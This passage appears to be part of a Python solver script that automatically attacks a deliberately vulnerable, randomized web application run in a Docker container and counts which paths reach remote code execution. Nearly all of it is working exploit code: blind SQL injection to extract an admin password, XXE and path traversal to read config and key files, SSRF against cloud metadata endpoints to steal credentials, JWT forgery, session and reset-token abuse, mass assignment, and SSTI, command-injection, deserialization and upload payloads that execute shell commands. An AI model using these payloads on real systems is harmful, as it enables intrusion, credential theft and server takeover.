    chars = ''.join(chr(c) for c in range(0x20, 0x7f) if chr(c) not in "'\"\\%_"); pw = ''
    for i in range(1, 48):
        if not _trad_blind_ok(slug, "%' AND (SELECT length(password) FROM users WHERE username='" + ADM + "') >= " + str(i) + " -- "): break
        f = None
        for c in chars:
            if _trad_blind_ok(slug, "%' AND (SELECT substr(password," + str(i) + ",1) FROM users WHERE username='" + ADM + "') = '" + c + "' -- "): f = c; break
        if f is None: return None
        pw += f
    return pw or None

def trad_cred(auth, blobd, headers):
    if auth == "jwt" and blobd.get("token"): return {"Authorization": "Bearer " + blobd["token"]}
    if auth == "apikey" and blobd.get("apiKey"): return {"X-API-Key": blobd["apiKey"]}
    if auth == "session":
        sc = headers.get("Set-Cookie", ""); m = re.search(r'mutie_sid=([^;]+)', sc)
        if m: return {"Cookie": "mutie_sid=" + m.group(1)}
    return None

def trad_gather(views, auth):
    facts = {}
    for v in views.get("content", []):
        slug = v["slug"]
        s, t, _ = trad_get("/b/" + slug + "/search?q=" + urllib.parse.quote(INJ)); d = mj(t)
        if isinstance(d, list):
            for r in d:
                if isinstance(r, dict) and r.get("name") == ADM and r.get("category"): facts["password"] = r["category"]
        if not facts.get("password") and isinstance(d, dict) and ("found" in d or (isinstance(d.get("query"), str) and ADM in d["query"])):
            pw = _trad_blind_pw(slug)
            if pw: facts["password"] = pw
    for v in views.get("import", []):
        for tgt in ("file:///app/config/app.conf", "file:///app/secret/app.key"):
            xml = '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "%s">]><invoice><customer>&x;</customer></invoice>' % tgt
            s, t, _ = trad_post("/b/" + v["slug"] + "/import", {"xml": xml}); d = mj(t) or {}
            leak = ((d.get("imported") or {}).get("customer")) or ""
            if leak:
                mm = re.search(r'admin\.password=(\S+)', leak); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
                if "password" not in leak and leak.strip(): facts["appkey"] = leak.strip()
    for v in views.get("fileportal", []):
        for name, key in (("../secret/app.key", "appkey"), ("../config/app.conf", "conf"), ("../sessions.json", "sess")):
            s, t, _ = trad_get("/b/" + v["slug"] + "/file?name=" + urllib.parse.quote(name)); d = mj(t) or {}
            txt = d.get("content") if isinstance(d, dict) else ""
            if not txt: continue
            if key == "appkey" and "password" not in txt: facts["appkey"] = txt.strip()
            mm = re.search(r'admin\.password=(\S+)', txt); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
            if key == "sess":
                arr = jparse(txt)
                if isinstance(arr, list):
                    for pair in arr:
                        if isinstance(pair, list) and len(pair) == 2 and pair[1] == ADM: facts["sid"] = pair[0]
    for v in views.get("disclosure", []):
        s, t, _ = trad_get("/b/" + v["slug"] + "/openapi"); spec = mj(t) or {}
        xi = spec.get("x-internal") or {}
        if xi.get("signingKey"): facts["appkey"] = xi["signingKey"]
        mm = re.search(r'admin\.password=(\S+)', xi.get("config", "") or ""); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
        if spec.get("x-admin-key"): facts["adminkey"] = spec["x-admin-key"]
        try:
            ex = spec["paths"]["/login"]["post"]["requestBody"]["content"]["application/json"]["example"]
            if ex and ex.get("password"): facts["password"] = facts.get("password") or ex["password"]
        except Exception: pass
        for opp in ("backup", "leak"):
            s, t, _ = trad_get("/b/" + v["slug"] + "/" + opp); d = mj(t) or {}; bf = d.get("text") or ""
            mm = re.search(r'admin\.password=(\S+)', bf); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
            mk = re.search(r'SIGNING_KEY=(\S+)', bf); facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
    for v in views.get("account", []):
        un = "u" + str(int(time.time() * 1000) % 1000000)
        trad_post("/b/" + v["slug"] + "/register", {"username": un, "password": "pw12345"})
        s, t, h = trad_post("/b/" + v["slug"] + "/login", {"username": un, "password": "pw12345"})
        cred = trad_cred(auth, mj(t) or {}, h)
        if cred:
            s2, t2, _ = trad_get("/b/" + v["slug"] + "/user-lookup?username=" + ADM, cred); d2 = mj(t2) or {}
            if d2.get("password"): facts["password"] = d2["password"]
            if d2.get("apikey"): facts["adminkey"] = facts.get("adminkey") or d2["apikey"]
    for v in views.get("webhook", []):
        for url in ("http://169.254.169.254/latest/meta-data/iam/security-credentials/role", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"):
            s, t, _ = trad_post("/b/" + v["slug"] + "/fetch", {"url": url, "method": "GET", "headers": "{}"}); d = mj(t) or {}
            if d.get("status") == 200:
                inner = jparse(d.get("body") or "") or {}; key = inner.get("SecretAccessKey") or inner.get("access_token")
                if key: facts["appkey"] = facts.get("appkey") or key
    return facts

def trad_admin_creds(views, auth, facts):
    cands = []
    if auth == "jwt":
        payload = {"username": ADM, "role": "admin", "exp": int(time.time()) + 3600}
        if facts.get("appkey"): cands.append(("jwt-forge", {"Authorization": "Bearer " + forge_hs256(facts["appkey"], payload)}))
        cands.append(("jwt-algnone", {"Authorization": "Bearer " + forge_none({"username": ADM, "role": "admin"})}))
        cands.append(("jwt-weak", {"Authorization": "Bearer " + forge_hs256("secret", payload)}))
    if auth == "session":
        cands.append(("session-predict", {"Cookie": "mutie_sid=s-1000"}))
        if facts.get("sid"): cands.append(("session-file", {"Cookie": "mutie_sid=" + facts["sid"]}))
        cands.append(("remember-me-b64", {"Cookie": "mutie_remember=" + base64.b64encode(ADM.encode()).decode()}))
        cands.append(("remember-me-plain", {"Cookie": "mutie_remember=" + ADM}))
    if auth == "apikey" and facts.get("adminkey"):
        cands.append(("apikey-leak", {"X-API-Key": facts["adminkey"]}))
    for v in views.get("account", []):
        slug = v["slug"]
        for inj in [ADM + "' -- ", "' OR role='admin' -- "]:
            s, t, h = trad_post("/b/" + slug + "/login", {"username": inj, "password": "x"}); c = trad_cred(auth, mj(t) or {}, h)
            if c: cands.append(("login-bypass", c))
        trad_post("/b/" + slug + "/reset", {"username": ADM})
        s, t, _ = trad_post("/b/" + slug + "/reset-confirm", {"username": ADM, "token": "rt-" + ADM, "password": "pwned123"})
        if (mj(t) or {}).get("ok"):
            s2, t2, h2 = trad_post("/b/" + slug + "/login", {"username": ADM, "password": "pwned123"}); c = trad_cred(auth, mj(t2) or {}, h2)
            if c: cands.append(("reset-weak", c))
        un = "pwn" + str(int(time.time() * 1000) % 100000)
        trad_post("/b/" + slug + "/register", {"username": un, "password": "pw12345", "role": "admin"})
        s, t, h = trad_post("/b/" + slug + "/login", {"username": un, "password": "pw12345"}); c = trad_cred(auth, mj(t) or {}, h)
        if c: cands.append(("mass-assign", c))
        # login-as / impersonation
        s, t, h = trad_post("/b/" + slug + "/login-as", {"username": ADM}); c = trad_cred(auth, mj(t) or {}, h)
        if c: cands.append(("login-as", c))
        # bola-write: user foothold -> overwrite admin password -> login as admin
        un2 = "uw" + str(int(time.time() * 1000) % 1000000)
        trad_post("/b/" + slug + "/register", {"username": un2, "password": "pw12345"})
        s, t, h = trad_post("/b/" + slug + "/login", {"username": un2, "password": "pw12345"}); uc = trad_cred(auth, mj(t) or {}, h)
        if uc:
            trad_post("/b/" + slug + "/profile-write", {"username": ADM, "password": "pwned123"}, uc)
            s, t, h = trad_post("/b/" + slug + "/login", {"username": ADM, "password": "pwned123"}); c = trad_cred(auth, mj(t) or {}, h)
            if c: cands.append(("bola-write", c))
        if facts.get("password"):
            s, t, h = trad_post("/b/" + slug + "/login", {"username": ADM, "password": facts["password"]}); c = trad_cred(auth, mj(t) or {}, h)
            if c: cands.append(("creds-login", c))
    return cands

def trad_try_sinks(views, hdr):
    ssti = ["{{ process.mainModule.require('child_process').execSync('id') }}", "<%= process.mainModule.require('child_process').execSync('id') %>",
            "{{{ process.mainModule.require('child_process').execSync('id') }}}", "- var cp = require('child_process')\n= cp.execSync('id').toString()"]
    for v in views.get("adminreport", []):
        for pl in ssti:
            s, t, _ = trad_post("/b/" + v["slug"] + "/render", {"template": pl, "data": "{}"}, hdr)
            if "uid=" in str((mj(t) or {}).get("output", "")): return "ssti"
    for v in views.get("adminbackup", []):
        for fld in ({"name": "x.tgz; id #"}, {"host": "127.0.0.1; id #"}, {"name": "x; id #"}, {"branch": "main; id #"}):
            s, t, _ = trad_post("/b/" + v["slug"] + "/backup", fld, hdr)
            if "uid=" in str((mj(t) or {}).get("log", "")): return "cmdi"
    for v in views.get("adminbackup", []) + views.get("account", []):
        for payload in (json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
                        json.dumps({"__js_function": "function(){ return process.mainModule.require('child_process').execSync('id').toString() }"})):
            s, t, _ = trad_post("/b/" + v["slug"] + "/import-job", {"job": payload}, hdr)
            if "uid=" in str((mj(t) or {}).get("result", "")): return "deser"
    for v in views.get("fileportal", []) + views.get("adminupload", []):
        for fn, content in (("s.js", "module.exports=()=>require('child_process').execSync('id').toString()"), ("t.ejs", "<%= process.mainModule.require('child_process').execSync('id') %>")):
            trad_post("/b/" + v["slug"] + "/ext", {"filename": fn, "content": content}, hdr)
            s, t, _ = trad_post("/b/" + v["slug"] + "/ext-run", {"name": fn}, hdr)
            if "uid=" in str((mj(t) or {}).get("output", "")): return "upload"
    return None

def trad_try_ssrf(views):
    for v in views.get("webhook", []):
        s, t, _ = trad_post("/b/" + v["slug"] + "/fetch", {"url": "http://127.0.0.1:9000/token", "method": "GET", "headers": "{}"}); d = mj(t) or {}
        if d.get("status") == 200:
            tok = (jparse(d.get("body") or "") or {}).get("token")
            if tok:
                s2, t2, _ = trad_post("/b/" + v["slug"] + "/fetch", {"url": "http://127.0.0.1:9000/run-task", "method": "POST",
                            "headers": json.dumps({"Content-Type": "application/json", "X-Task-Token": tok}), "body": json.dumps({"cmd": "id"})}); d2 = mj(t2) or {}
                if d2.get("status") == 200 and "uid=" in (jparse(d2.get("body") or "") or {}).get("output", ""): return "ssrf->run-task"
    return None

def solve_trad(m):
    views = views_by_kind(m); auth = m.get("auth")
    facts = trad_gather(views, auth)
    for how, hdr in trad_admin_creds(views, auth, facts):
        sink = trad_try_sinks(views, hdr)
        if sink: return True, auth, how + "|trad", sink
    p = trad_try_ssrf(views)
    if p: return True, auth, "ssrf|trad", p
    return False, auth, None, None

def wait_ready(timeout=30):
    deadline = time.time() + timeout
    while time.time() < deadline:
        s, t, _ = get("/manifest")
        if s == 200 and jparse(t):
            return True
        time.sleep(0.4)
    return False

if __name__ == "__main__":
    N = int(sys.argv[1]) if len(sys.argv) > 1 else 12
    ok = 0; ways = {}; sinks = {}
    for i in range(N):
        if i > 0:
            subprocess.run(["docker", "restart", "mu"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            wait_ready()
        s, t, _ = get("/manifest"); m = jparse(t) or {}
        if m.get("api") == "graphql":
            success, auth, how, sink = solve_gql(m)
        elif m.get("api") == "traditional":
            success, auth, how, sink = solve_trad(m)
        else:
            success, auth, how, sink = solve()
        ok += 1 if success else 0
        if success: ways[how] = ways.get(how, 0) + 1; sinks[sink] = sinks.get(sink, 0) + 1
        print(f"  [{'OK  ' if success else 'FAIL'}] seed={m.get('seed')} auth={auth}  via {how} -> {sink}")
    print(f"\n  blind RCE solved: {ok}/{N} restarts")
    print("  admin-reach paths that fired:", ways)
    print("  RCE sinks that fired       :", sinks)
